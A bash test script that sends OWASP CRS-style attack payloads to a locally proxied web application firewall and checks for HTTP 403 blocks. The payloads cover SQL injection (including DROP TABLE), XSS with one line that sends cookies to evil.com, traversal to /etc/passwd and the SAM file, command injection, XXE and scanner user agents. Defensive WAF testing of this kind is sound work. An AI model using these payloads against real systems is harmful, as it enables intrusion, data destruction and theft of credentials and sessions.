#!/bin/bash
#
# WAF Agent Test Scenarios
# Tests OWASP CRS-style attack detection and blocking
#

set -euo pipefail

PROXY_HOST="${PROXY_HOST:-localhost}"
PROXY_PORT="${PROXY_PORT:-8080}"
WAF_METRICS_PORT="${WAF_METRICS_PORT:-9094}"
BASE_URL="http://${PROXY_HOST}:${PROXY_PORT}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

PASSED=0
FAILED=0
BLOCKED=0

pass() { echo -e "${GREEN}[PASS]${NC} $1"; ((PASSED++)); }
fail() { echo -e "${RED}[FAIL]${NC} $1"; ((FAILED++)); }
info() { echo -e "${YELLOW}[INFO]${NC} $1"; }
blocked() { echo -e "${BLUE}[BLOCKED]${NC} $1"; ((BLOCKED++)); }

# Test if attack is blocked (expects 403)
test_blocked() {
    local name="$1"
    local status="$2"

    if [[ "$status" == "403" ]]; then
        blocked "$name blocked (HTTP 403)"
        return 0
    elif [[ "$status" == "200" ]]; then
        info "$name not blocked (HTTP 200) - WAF may be in detection mode"
        return 1
    else
        info "$name returned HTTP $status"
        return 1
    fi
}

echo "═══════════════════════════════════════════════════════"
echo "  WAF Agent Security Test Scenarios"
echo "═══════════════════════════════════════════════════════"
echo ""

# Test 0: WAF Agent health
info "Test 0: WAF agent health check"
metrics=$(curl -sf "http://${PROXY_HOST}:${WAF_METRICS_PORT}/metrics" 2>/dev/null || echo "")
if [[ -n "$metrics" ]]; then
    pass "WAF agent metrics accessible"
else
    info "WAF metrics not accessible - some tests may fail"
fi

# Test 1: Legitimate requests pass through
info "Test 1: Legitimate requests allowed"
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/legitimate")
if [[ "$status" == "200" ]]; then
    pass "Legitimate request allowed"
else
    fail "Legitimate request blocked (HTTP $status)"
fi

# ═══════════════════════════════════════════════════════
# SQL Injection Tests
# ═══════════════════════════════════════════════════════
info ""
info "═══ SQL Injection Tests ═══"

# Classic SQL injection
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?id=1' OR '1'='1")
test_blocked "Classic SQLi (OR 1=1)" "$status"

# UNION-based injection
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?id=1 UNION SELECT * FROM users--")
test_blocked "UNION SQLi" "$status"

# Stacked queries
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?id=1; DROP TABLE users--")
test_blocked "Stacked queries SQLi" "$status"

# Blind SQL injection
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?id=1 AND 1=1")
test_blocked "Blind SQLi (AND 1=1)" "$status"

# SQL injection in POST body
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin'--&password=x")
test_blocked "SQLi in POST body" "$status"

# SQL injection in JSON
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/api" \
    -H "Content-Type: application/json" \
    -d '{"query":"SELECT * FROM users WHERE id=1 OR 1=1"}')
test_blocked "SQLi in JSON body" "$status"

# ═══════════════════════════════════════════════════════
# XSS (Cross-Site Scripting) Tests
# ═══════════════════════════════════════════════════════
info ""
info "═══ XSS Tests ═══"

# Basic script tag
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?input=<script>alert('XSS')</script>")
test_blocked "Script tag XSS" "$status"

# Event handler XSS
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?input=<img src=x onerror=alert('XSS')>")
test_blocked "Event handler XSS" "$status"

# SVG-based XSS
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?input=<svg onload=alert('XSS')>")
test_blocked "SVG XSS" "$status"

# JavaScript protocol
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?url=javascript:alert('XSS')")
test_blocked "JavaScript protocol XSS" "$status"

# XSS in POST
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/comment" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "comment=<script>document.location='http://evil.com/'+document.cookie</script>")
test_blocked "XSS in POST body" "$status"

# ═══════════════════════════════════════════════════════
# Path Traversal Tests
# ═══════════════════════════════════════════════════════
info ""
info "═══ Path Traversal Tests ═══"

# Basic path traversal
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/../../../etc/passwd")
test_blocked "Basic path traversal" "$status"

# Encoded path traversal
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/%2e%2e/%2e%2e/etc/passwd")
test_blocked "URL-encoded traversal" "$status"

# Double-encoded
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/%252e%252e%252f%252e%252e%252fetc/passwd")
test_blocked "Double-encoded traversal" "$status"

# Windows-style path traversal
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/..\\..\\..\\windows\\system32\\config\\sam")
test_blocked "Windows path traversal" "$status"

# ═══════════════════════════════════════════════════════
# Command Injection Tests
# ═══════════════════════════════════════════════════════
info ""
info "═══ Command Injection Tests ═══"

# Semicolon injection
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/exec" \
    -d "cmd=ls; cat /etc/passwd")
test_blocked "Semicolon command injection" "$status"

# Pipe injection
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/exec" \
    -d "cmd=ls | cat /etc/passwd")
test_blocked "Pipe command injection" "$status"

# Command substitution
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/exec" \
    -d "cmd=\$(cat /etc/passwd)")
test_blocked "Command substitution" "$status"

# Backtick injection
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/exec" \
    -d "cmd=\`id\`")
test_blocked "Backtick injection" "$status"

# ═══════════════════════════════════════════════════════
# Protocol/Header Attacks
# ═══════════════════════════════════════════════════════
info ""
info "═══ Protocol/Header Attacks ═══"

# Malicious user agent
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/" \
    -H "User-Agent: sqlmap/1.0")
test_blocked "SQLMap user agent" "$status"

# Nikto scanner
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/" \
    -H "User-Agent: Nikto/2.1.6")
test_blocked "Nikto user agent" "$status"

# Host header injection
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/" \
    -H "Host: evil.com")
if [[ "$status" =~ ^(200|400|403)$ ]]; then
    info "Host header test: HTTP $status"
fi

# ═══════════════════════════════════════════════════════
# WAF Bypass/Exclusion Tests
# ═══════════════════════════════════════════════════════
info ""
info "═══ WAF Exclusion Tests ═══"

# Health check bypass
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/health?test=' OR '1'='1")
if [[ "$status" == "200" ]]; then
    pass "Health endpoint bypasses WAF"
else
    info "Health endpoint status: $status"
fi

# Bypass header
status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/?id=' OR '1'='1" \
    -H "X-WAF-Bypass: test-secret-key")
if [[ "$status" == "200" ]]; then
    pass "Bypass header works"
else
    info "Bypass header test: HTTP $status"
fi

# ═══════════════════════════════════════════════════════
# Body Inspection Tests
# ═══════════════════════════════════════════════════════
info ""
info "═══ Body Inspection Tests ═══"

# JSON body inspection
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/api" \
    -H "Content-Type: application/json" \
    -d '{"name":"<script>alert(1)</script>"}')
test_blocked "XSS in JSON body" "$status"

# Form data inspection
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/form" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "field='; DROP TABLE users;--")
test_blocked "SQLi in form data" "$status"

# XML body inspection
status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/protected/xml" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><root><data><!ENTITY xxe SYSTEM "file:///etc/passwd"></data></root>')
test_blocked "XXE in XML body" "$status"

# ═══════════════════════════════════════════════════════
# Performance/Stress Tests
# ═══════════════════════════════════════════════════════
info ""
info "═══ WAF Performance Tests ═══"

# Rapid legitimate requests
info "Testing WAF performance with legitimate traffic..."
start_time=$(date +%s%N)
success=0
for i in {1..50}; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/protected/perf-$i")
    if [[ "$status" == "200" ]]; then
        ((success++))
    fi
done
end_time=$(date +%s%N)
duration_ms=$(( (end_time - start_time) / 1000000 ))

info "50 requests completed in ${duration_ms}ms ($success allowed)"
if [[ $success -ge 45 ]]; then
    pass "WAF performance acceptable"
else
    info "WAF may be blocking legitimate traffic"
fi

echo ""
echo "═══════════════════════════════════════════════════════"
echo "  Security Test Results"
echo "═══════════════════════════════════════════════════════"
echo ""
echo -e "  ${GREEN}Tests passed:${NC}    $PASSED"
echo -e "  ${BLUE}Attacks blocked:${NC} $BLOCKED"
echo -e "  ${RED}Tests failed:${NC}    $FAILED"
echo ""

if [[ $BLOCKED -gt 0 ]]; then
    echo -e "${GREEN}WAF is actively blocking attacks!${NC}"
else
    echo -e "${YELLOW}WAF may be in detection-only mode or not active${NC}"
fi

exit $FAILED
